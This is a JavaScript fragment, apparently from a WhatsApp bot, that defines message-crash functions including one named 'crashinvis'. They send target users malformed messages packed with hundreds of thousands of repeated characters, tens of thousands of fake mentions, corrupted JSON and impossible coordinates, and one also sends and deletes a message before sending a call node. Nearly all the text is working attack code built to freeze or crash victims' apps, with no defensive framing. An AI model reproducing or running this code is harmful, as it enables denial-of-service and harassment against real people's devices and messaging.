                                    directPath: "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
                                    fileLength: { low: 1, high: 0, unsigned: true },
                                    mediaKeyTimestamp: { low: 1746112211, high: 0, unsigned: false },
                                    firstFrameLength: 19904,
                                    firstFrameSidecar: "KN4kQ5pyABRAgA==",
                                    isAnimated: true,
                                    isAvatar: false,
                                    isAiSticker: false,
                                    isLottie: false,
                                    contextInfo: {
                                        mentionedJid: target,
                                    }
                                },
                                hasMediaAttachment: true
                            },
                            body: {
                                text: ' '
                            },
                            footer: {
                                text: ' '
                            },
                            nativeFlowMessage: {
                                messageParamsJson: "\n".repeat(10000)
                            },
                            contextInfo: {
                                id: nando.generateMessageTag(),
                                forwardingScore: 999,
                                isForwarding: true,
                                participant: "0@s.whatsapp.net",
                                remoteJid: "X",
                                mentionedJid: ["0@s.whatsapp.net"]
                            }
                        }]
                    }
                }
            }
        }
    };

    const pertama = await nando.relayMessage(target, NanMsg, {
      messageId: null,
      participant: { jid: target },
      userJid: target,
    });
    
    await nando.sendMessage(target, { 
      delete: {
        fromMe: true,
        remoteJid: target,
        id: pertama,
      }
    });
    
    await nando.sendNode(callNode);
}

async function crashinvis(target, sock) {
  try {
    const mentionedMetaAi = [
      "13135550001@s.whatsapp.net", "13135550002@s.whatsapp.net",
      "13135550003@s.whatsapp.net", "13135550004@s.whatsapp.net",
      "13135550005@s.whatsapp.net", "13135550006@s.whatsapp.net",
      "13135550007@s.whatsapp.net", "13135550008@s.whatsapp.net",
      "13135550009@s.whatsapp.net", "13135550010@s.whatsapp.net"
    ];
    const metaSpam = Array.from({ length: 30000 }, () => `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`);
    const textSpam = "᬴".repeat(250000);
    const mentionSpam = Array.from({ length: 1950 }, () => `1${Math.floor(Math.random() * 999999999)}@s.whatsapp.net`);
    const invisibleChar = '\u2063'.repeat(500000) + "@0".repeat(50000);
    const contactName = "🩸⃟ ༚ 𝑷𝒉𝒐𝒆𝒏𝒊𝒙⌁𝑰𝒏𝒗𝒊𝒄𝒕𝒖𝒔⃰‌ཀ‌‌🦠-‣";
    const triggerChar = "𑇂𑆵𑆴𑆿".repeat(60000);
    const contactAmount = 200;
    const corruptedJson = "{".repeat(500000);
    const mention40k = Array.from({ length: 40000 }, (_, i) => `${i}@s.whatsapp.net`);
    const mention16k = Array.from({ length: 1600 }, () => `${Math.floor(1e11 + Math.random() * 9e11)}@s.whatsapp.net`);
    const randomMentions = Array.from({ length: 10 }, () => "0@s.whatsapp.net");

    await sock.relayMessage(target, {
      orderMessage: {
        orderId: "1228296005631191",
        thumbnail: { url: "https://files.catbox.moe/ykvioj.jpg" },
        itemCount: 9999999999,
        status: "INQUIRY",
        surface: "CATALOG",
        message: `${'ꦾ'.repeat(60000)}`,
        orderTitle: "🩸⃟ ༚ 𝑷𝒉𝒐𝒆𝒏𝒊𝒙⌁𝑰𝒏𝒗𝒊𝒄𝒕𝒖𝒔⃰‌ཀ‌‌🦠-‣",
        sellerJid: "5521992999999@s.whatsapp.net",
        token: "Ad/leFmSZ2bEez5oa0i8hasyGqCqqo245Pqu8XY6oaPQRw==",
        totalAmount1000: "9999999999",
        totalCurrencyCode: "USD",
        messageVersion: 2,
        viewOnce: true,
        contextInfo: {
          mentionedJid: [target, ...mentionedMetaAi, ...metaSpam],
          externalAdReply: {
            title: "ꦾ".repeat(20000),
            mediaType: 2,
            renderLargerThumbnail: true,
            showAdAttribution: true,
            containsAutoReply: true,
            body: "©LuciferNotDev",
            thumbnail: { url: "https://files.catbox.moe/kst7w4.jpg" },
            sourceUrl: "about:blank",
            sourceId: client.generateMessageTag(),
            ctwaClid: "ctwaClid",
            ref: "ref",
            clickToWhatsappCall: true,
            ctaPayload: "ctaPayload",
            disableNudge: false,
            originalimgLink: "about:blank"
          },
          quotedMessage: {
            callLogMesssage: {
              isVideo: true,
              callOutcome: 0,
              durationSecs: "9999",
              callType: "VIDEO",
              participants: [{ jid: target, callOutcome: 1 }]
            }
          }
        }
      }
    }, {});

    await sock.sendMessage(target, {
      text: textSpam,
      contextInfo: { mentionedJid: mentionSpam }
    }, { quoted: null });

    await sock.relayMessage(target, {
      ephemeralMessage: {
        message: {
          interactiveMessage: {
            header: {
              locationMessage: {
                degreesLatitude: 9999,
                degreesLongitude: 9999
              },
              hasMediaAttachment: true
            },
            body: { text: invisibleChar },
            nativeFlowMessage: {},
            contextInfo: { mentionedJid: randomMentions }
          }
        }
      }
    }, {});
  } catch (e) {
    console.error(e);
  }
}
//


bot.launch()
